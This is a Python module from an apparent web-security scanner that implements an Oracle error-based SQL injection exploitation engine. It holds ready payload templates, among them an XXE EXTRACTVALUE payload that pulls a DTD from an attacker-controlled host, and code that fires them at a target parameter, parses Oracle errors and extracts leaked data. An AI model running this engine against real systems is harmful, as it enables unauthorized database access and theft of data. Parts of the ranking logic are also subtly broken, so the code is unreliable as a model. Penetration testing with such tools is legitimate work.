# app/modules/scanner/error_based.py
"""
Oracle Error-Based Exploitation Engine for SentinelAI.
Phase 13: Error-Based SQL Injection Detection and Exploitation
"""

import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any

import requests

from .html_parser import HTMLParser
from .regex_utils import RegexUtils
from .union_sqli import UnionSQLi

# ============================================================
# Data Classes
# ============================================================


@dataclass
class ErrorBasedResult:
    """
    Error-based SQL injection detection and exploitation result.
    """

    success: bool = False
    is_vulnerable: bool = False
    oracle_errors: list[str] = field(default_factory=list)
    detected_error_codes: list[str] = field(default_factory=list)
    working_payloads: list[str] = field(default_factory=list)
    best_payload: str | None = None
    extracted_values: dict[str, Any] = field(default_factory=dict)
    confidence: int = 0
    evidence: list[str] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    execution_time: float = 0.0
    error_messages: list[str] = field(default_factory=list)
    ranked_payloads: list[dict[str, Any]] = field(default_factory=list)

    def add_error(self, error: str):
        """Add an error to the result."""
        if error and error not in self.errors:
            self.errors.append(error)

    def add_evidence(self, evidence: str):
        """Add evidence to the result."""
        if evidence and evidence not in self.evidence:
            self.evidence.append(evidence)

    def add_working_payload(self, payload: str):
        """Add a working payload to the result."""
        if payload and payload not in self.working_payloads:
            self.working_payloads.append(payload)

    def add_oracle_error(self, error: str):
        """Add an Oracle error to the result."""
        if error and error not in self.oracle_errors:
            self.oracle_errors.append(error)

    def add_error_code(self, code: str):
        """Add an error code to the result."""
        if code and code not in self.detected_error_codes:
            self.detected_error_codes.append(code)

    def get_summary(self) -> str:
        """Get a summary of the detection result."""
        if not self.success:
            return "Error-based detection failed"

        if not self.is_vulnerable:
            return "Error-based SQL injection not detected"

        parts = []
        parts.append("Vulnerable: YES")
        if self.detected_error_codes:
            parts.append(f"Error codes: {', '.join(self.detected_error_codes[:3])}")
        if self.best_payload:
            parts.append(f"Best payload: {self.best_payload[:30]}...")
        if self.extracted_values:
            parts.append(f"Extracted: {len(self.extracted_values)} values")
        if self.confidence > 0:
            parts.append(f"Confidence: {self.confidence}%")

        return f"Error Based: {', '.join(parts)}"

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "success": self.success,
            "is_vulnerable": self.is_vulnerable,
            "oracle_errors": self.oracle_errors,
            "detected_error_codes": self.detected_error_codes,
            "working_payloads": self.working_payloads,
            "best_payload": self.best_payload,
            "extracted_values": self.extracted_values,
            "confidence": self.confidence,
            "evidence": self.evidence,
            "errors": self.errors,
            "execution_time": self.execution_time,
            "error_messages": self.error_messages,
            "summary": self.get_summary(),
        }


# ============================================================
# Main Error Based Engine Class
# ============================================================


class OracleErrorBasedEngine:
    """
    Oracle Error-Based Exploitation Engine.
    Phase 13: Detects and exploits error-based SQL injection.
    """

    # ============================================================
    # Constants
    # ============================================================

    # Oracle error patterns
    ERROR_PATTERNS = {
        "ORA-00933": r"ORA-00933: SQL command not properly ended",
        "ORA-00942": r"ORA-00942: table or view does not exist",
        "ORA-00904": r"ORA-00904: .*? invalid identifier",
        "ORA-01427": r"ORA-01427: single-row subquery returns more than one row",
        "ORA-01722": r"ORA-01722: invalid number",
        "ORA-06502": r"ORA-06502: PL/SQL: numeric or value error",
        "ORA-01858": r"ORA-01858: a non-numeric character was found where a numeric was expected",
        "ORA-31011": r"ORA-31011: XML parsing failed",
        "LPX-": r"LPX-\d{5}:",
    }

    # Error-based payload templates
    PAYLOAD_TEMPLATES = {
        "xmltype": "AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||{data}||CHR(62))) FROM dual)--",
        "extractvalue": "AND 1=(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://{host}/{path}\">%remote;]>'),'/l') FROM dual)--",
        "updatexml": "AND 1=(SELECT UPDATEXML(xmltype('<?xml version=\"1.0\"?><root><a>1</a></root>'),'/root/a',{data}) FROM dual)--",
        "dbms_xmlgen": "AND 1=(SELECT DBMS_XMLGEN.GETXML('SELECT {data} FROM dual') FROM dual)--",
        "utl_inaddr": "AND 1=(SELECT UTL_INADDR.GET_HOST_NAME('{data}') FROM dual)--",
        "ctxsys": "AND 1=(SELECT CTXSYS.DRITHSX.SN('{data}') FROM dual)--",
        "to_number": "AND 1=TO_NUMBER('{data}')--",
        "to_char": "AND 1=TO_CHAR({data})--",
        "cast": "AND 1=CAST({data} AS NUMBER)--",
        "chr_concat": "AND 1=(SELECT CHR({data}) FROM dual)--",
    }

    # Extraction patterns
    EXTRACTION_PATTERNS = {
        "oracle_error": r"ORA-\d{5}",
        "error_message": r"ORA-\d{5}:.*?(?:\n|$)",
        "xml_error": r"LPX-\d{5}:.*?(?:\n|$)",
        "numeric_value": r"\b\d+\b",
        "string_value": r"'([^']*)'",
        "leaked_value": r"[A-Za-z0-9_$]+",
    }

    # Confidence thresholds
    CONFIDENCE_HIGH = 90
    CONFIDENCE_MEDIUM = 70
    CONFIDENCE_LOW = 50

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: logging.Logger | None = None,
    ):
        """
        Initialize Oracle Error-Based Engine.

        Args:
            session: Requests session for HTTP requests
            base_url: Target base URL
            logger: Optional logger instance
        """
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        # Initialize components
        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()

        # State
        self.baseline_response = None
        self.error_result = None

        self.logger.info("[ErrorBased] Module initialized for error-based exploitation")
        self.logger.info(f"[ErrorBased] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("ErrorBased")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _get_baseline(self, injection_point: str) -> requests.Response | None:
        """Get baseline response for comparison."""
        if self.baseline_response is None:
            self.logger.info("[ErrorBased] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.logger.info(
                    f"[ErrorBased] Baseline response length: {len(self.baseline_response.text)}"
                )
            else:
                self.logger.warning("[ErrorBased] Failed to get baseline response")

        return self.baseline_response

    def _send_payload(
        self, injection_point: str, payload: str
    ) -> requests.Response | None:
        """Send a payload and return the response."""
        baseline = self._get_baseline(injection_point)
        result = self.union_sqli.test_payload(injection_point, payload, baseline)

        if not result["success"] or result.get("response") is None:
            return None

        return result["response"]

    def _parse_oracle_error(self, text: str) -> str | None:
        """
        Parse Oracle error from text.

        Args:
            text: Text to parse

        Returns:
            Optional[str]: Parsed error message or None
        """
        if not text:
            return None

        # Check for Oracle errors
        for pattern in self.ERROR_PATTERNS.values():
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(0)

        # Check for ORA- errors
        match = re.search(r"ORA-\d{5}:.*?(?:\n|$)", text, re.IGNORECASE)
        if match:
            return match.group(0).strip()

        return None

    def _detect_error_code(self, text: str) -> str | None:
        """
        Detect Oracle error code from text.

        Args:
            text: Text to parse

        Returns:
            Optional[str]: Error code or None
        """
        match = re.search(r"ORA-(\d{5})", text, re.IGNORECASE)
        if match:
            return f"ORA-{match.group(1)}"

        match = re.search(r"LPX-(\d{5})", text, re.IGNORECASE)
        if match:
            return f"LPX-{match.group(1)}"

        return None

    def _extract_from_error(self, text: str) -> list[str]:
        """
        Extract leaked values from error message.

        Args:
            text: Error message text

        Returns:
            List[str]: Extracted values
        """
        values = []

        # Extract quoted strings
        quoted = re.findall(r"'([^']*)'", text)
        values.extend(quoted)

        # Extract values after error messages
        patterns = [
            r"ORA-.*?:\s*([A-Za-z0-9_$]+)",
            r"invalid identifier:\s*([A-Za-z0-9_$]+)",
            r"table or view does not exist:\s*([A-Za-z0-9_$]+)",
        ]

        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            values.extend(matches)

        return list(set(values))

    def _calculate_confidence(
        self, error_count: int, has_extracted: bool, payload_types: int
    ) -> int:
        """
        Calculate confidence based on detection indicators.

        Args:
            error_count: Number of errors detected
            has_extracted: Whether extraction was successful
            payload_types: Number of payload types that worked

        Returns:
            int: Confidence score (0-100)
        """
        confidence = 0

        # Error count
        if error_count >= 5:
            confidence += 40
        elif error_count >= 3:
            confidence += 30
        elif error_count >= 1:
            confidence += 20

        # Extraction
        if has_extracted:
            confidence += 30

        # Payload variety
        if payload_types >= 3:
            confidence += 20
        elif payload_types >= 2:
            confidence += 10

        return min(confidence, 100)

    # ============================================================
    # Public Methods
    # ============================================================

    def detect_error_based(
        self, injection_point: str, max_payloads: int = 30
    ) -> ErrorBasedResult:
        """
        Detect error-based SQL injection.

        Args:
            injection_point: Parameter to inject into
            max_payloads: Maximum payloads to test

        Returns:
            ErrorBasedResult: Detection result
        """
        self.logger.info(
            "[ErrorBased] =================================================="
        )
        self.logger.info("[ErrorBased] PHASE 13: Error-Based Exploitation")
        self.logger.info(
            "[ErrorBased] =================================================="
        )

        result = ErrorBasedResult()
        total_start = time.time()

        try:
            # Get baseline
            baseline = self._get_baseline(injection_point)
            if not baseline:
                result.add_error("Failed to get baseline response")
                return result

            # Generate payloads
            self.logger.info("[ErrorBased] Generating error-based payloads...")
            payloads = self.build_error_payloads()

            # Limit payloads
            if len(payloads) > max_payloads:
                payloads = payloads[:max_payloads]

            self.logger.info(f"[ErrorBased] Testing {len(payloads)} payloads...")

            working_payloads = []
            error_messages = []
            error_codes = []
            extracted_values = []

            for payload in payloads:
                self.logger.debug(f"[ErrorBased] Testing payload: {payload[:50]}...")

                response = self._send_payload(injection_point, payload)

                if not response:
                    continue

                response_text = response.text

                # Check for Oracle errors
                error_msg = self._parse_oracle_error(response_text)
                error_code = self._detect_error_code(response_text)
                extracted = self._extract_from_error(response_text)

                if error_msg:
                    result.add_oracle_error(error_msg)
                    result.error_messages.append(error_msg)
                    result.add_working_payload(payload)
                    working_payloads.append(payload)

                    if error_code:
                        result.add_error_code(error_code)
                        error_codes.append(error_code)

                    if extracted:
                        for value in extracted:
                            if value and len(value) > 1:
                                extracted_values.append(value)

                    self.logger.info(
                        f"[ErrorBased] Found error: {error_code or 'Unknown'} with payload: {payload[:30]}..."
                    )

            # Rank payloads
            ranked = self.rank_payloads(working_payloads, error_codes, extracted_values)
            result.ranked_payloads = ranked

            # Determine best payload
            if ranked:
                result.best_payload = ranked[0].get("payload")

            # Store extracted values
            for i, value in enumerate(extracted_values[:10]):
                result.extracted_values[f"value_{i + 1}"] = value

            # Calculate confidence
            result.confidence = self._calculate_confidence(
                len(error_codes),
                len(extracted_values) > 0,
                len(set(p["type"] for p in ranked if "type" in p)),
            )

            # Determine vulnerability
            result.is_vulnerable = len(working_payloads) > 0 and result.confidence >= 40

            if result.is_vulnerable:
                result.add_evidence(
                    f"Error-based injection confirmed with {len(working_payloads)} working payloads"
                )
                result.add_evidence(
                    f"Detected error codes: {', '.join(error_codes[:5])}"
                )
            else:
                result.add_evidence("No error-based injection detected")

            result.success = True

        except Exception as e:
            error_msg = f"Error-based detection failed: {e!s}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        result.execution_time = time.time() - total_start

        self.logger.info(
            "[ErrorBased] =================================================="
        )
        self.logger.info("[ErrorBased] ERROR-BASED DETECTION COMPLETE")
        self.logger.info(f"[ErrorBased] {result.get_summary()}")
        self.logger.info(f"[ErrorBased] Time: {result.execution_time:.2f}s")
        self.logger.info(
            "[ErrorBased] =================================================="
        )

        self.error_result = result
        return result

    def find_best_payload(self, injection_point: str) -> str | None:
        """
        Find the best error-based payload.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Optional[str]: Best payload or None
        """
        if self.error_result and self.error_result.best_payload:
            return self.error_result.best_payload

        result = self.detect_error_based(injection_point)
        if result.success and result.is_vulnerable:
            return result.best_payload
        return None

    def build_error_payloads(self) -> list[str]:
        """
        Build error-based payloads.

        Returns:
            List[str]: List of payloads
        """
        payloads = []

        # Test values for different payload types
        test_data = [
            ("to_number", "1"),
            ("to_number", "test"),
            ("to_char", "1"),
            ("cast", "test"),
            ("chr_concat", "65"),
            ("xmltype", "'test'"),
            ("dbms_xmlgen", "'test'"),
            ("updatexml", "'<test>'"),
        ]

        for payload_type, data in test_data:
            template = self.PAYLOAD_TEMPLATES.get(payload_type)
            if template:
                try:
                    payload = f"'{template.format(data=data)}"
                    payloads.append(payload)
                except Exception:
                    continue

        # Add variations with different injection points
        base_payloads = payloads.copy()
        for payload in base_payloads:
            # Add without trailing comment
            if payload.endswith("--"):
                payloads.append(payload[:-2])
            # Add with hash
            if "--" in payload:
                payloads.append(payload.replace("--", "#"))

        return payloads

    def extract_from_error(self, text: str) -> list[str]:
        """
        Extract values from error message.

        Args:
            text: Error message text

        Returns:
            List[str]: Extracted values
        """
        return self._extract_from_error(text)

    def parse_oracle_error(self, text: str) -> str | None:
        """
        Parse Oracle error from text.

        Args:
            text: Text to parse

        Returns:
            Optional[str]: Parsed error message or None
        """
        return self._parse_oracle_error(text)

    def detect_error_code(self, text: str) -> str | None:
        """
        Detect Oracle error code from text.

        Args:
            text: Text to parse

        Returns:
            Optional[str]: Error code or None
        """
        return self._detect_error_code(text)

    def verify_error(self, injection_point: str, payload: str) -> dict[str, Any]:
        """
        Verify an error-based payload.

        Args:
            injection_point: Parameter to inject into
            payload: Payload to verify

        Returns:
            Dict: Verification results
        """
        self.logger.info(f"[ErrorBased] Verifying payload: {payload[:50]}...")

        response = self._send_payload(injection_point, payload)

        if not response:
            return {"success": False, "verified": False, "error": "Request failed"}

        error_msg = self._parse_oracle_error(response.text)
        error_code = self._detect_error_code(response.text)
        extracted = self._extract_from_error(response.text)

        return {
            "success": True,
            "verified": error_msg is not None,
            "error_message": error_msg,
            "error_code": error_code,
            "extracted_values": extracted,
            "confidence": 80 if error_msg else 0,
        }

    def rank_payloads(
        self, payloads: list[str], error_codes: list[str], extracted_values: list[str]
    ) -> list[dict[str, Any]]:
        """
        Rank payloads by effectiveness.

        Args:
            payloads: List of payloads
            error_codes: List of error codes
            extracted_values: List of extracted values

        Returns:
            List[Dict]: Ranked payloads with scores
        """
        ranked = []

        for i, payload in enumerate(payloads):
            score = 0
            error_code = error_codes[i] if i < len(error_codes) else None
            extracted = extracted_values[i] if i < len(extracted_values) else []

            # Score based on error code
            if error_code:
                if error_code in ["ORA-00933", "ORA-00904", "ORA-00942"]:
                    score += 30
                elif error_code in ["ORA-01722", "ORA-06502", "ORA-01858"]:
                    score += 25
                else:
                    score += 20

            # Score based on extraction
            if extracted:
                score += min(len(extracted) * 10, 30)

            # Score based on payload length (shorter = better)
            score += max(0, 10 - (len(payload) // 10))

            ranked.append(
                {
                    "payload": payload,
                    "score": score,
                    "error_code": error_code,
                    "extracted_values": extracted,
                    "type": "error_based",
                }
            )

        # Sort by score (highest first)
        ranked.sort(key=lambda x: x["score"], reverse=True)

        return ranked

    def calculate_confidence(
        self, error_count: int, has_extracted: bool, payload_types: int
    ) -> int:
        """
        Calculate confidence based on detection indicators.

        Args:
            error_count: Number of errors detected
            has_extracted: Whether extraction was successful
            payload_types: Number of payload types that worked

        Returns:
            int: Confidence score (0-100)
        """
        return self._calculate_confidence(error_count, has_extracted, payload_types)

    def generate_payload(self, payload_type: str, data: str) -> str:
        """
        Generate an error-based payload.

        Args:
            payload_type: Type of payload (xmltype, to_number, etc.)
            data: Data to inject

        Returns:
            str: Generated payload
        """
        template = self.PAYLOAD_TEMPLATES.get(payload_type)
        if not template:
            raise ValueError(f"Unknown payload type: {payload_type}")

        payload = template.format(data=data)
        return f"'{payload}"

    def is_error_based(self, injection_point: str) -> bool:
        """
        Quick check if parameter is vulnerable to error-based injection.

        Args:
            injection_point: Parameter to test

        Returns:
            bool: True if vulnerable
        """
        result = self.detect_error_based(injection_point)
        return result.is_vulnerable

    def get_best_error_payload(self, injection_point: str) -> str | None:
        """
        Get the best error-based payload.

        Args:
            injection_point: Parameter to test

        Returns:
            Optional[str]: Best payload or None
        """
        return self.find_best_payload(injection_point)

    def extract_error_data(self, injection_point: str, payload: str) -> list[str]:
        """
        Extract data from error message using a payload.

        Args:
            injection_point: Parameter to inject into
            payload: Payload to use

        Returns:
            List[str]: Extracted values
        """
        response = self._send_payload(injection_point, payload)

        if not response:
            return []

        return self._extract_from_error(response.text)
